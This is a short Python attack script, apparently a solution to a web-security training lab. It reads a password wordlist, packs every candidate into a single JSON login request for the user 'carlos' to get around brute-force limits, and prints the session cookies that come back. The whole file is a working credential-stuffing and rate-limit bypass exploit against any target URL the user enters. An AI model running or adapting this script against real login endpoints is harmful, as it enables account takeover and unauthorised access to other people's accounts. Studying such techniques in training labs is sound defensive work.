#!/usr/bin/env python3

import requests

s = requests.Session()
URL = input("Enter target url: ")

with open("passwords.txt") as file:
    passwords = file.read()
    pass_list = passwords.split()

list = str(pass_list).replace("'", '"')
data = '{"username": "carlos", "password":' + list + ' , "": ""}'
response = s.post(url=URL, data=data)

cookie = s.cookies.items()
print(cookie)
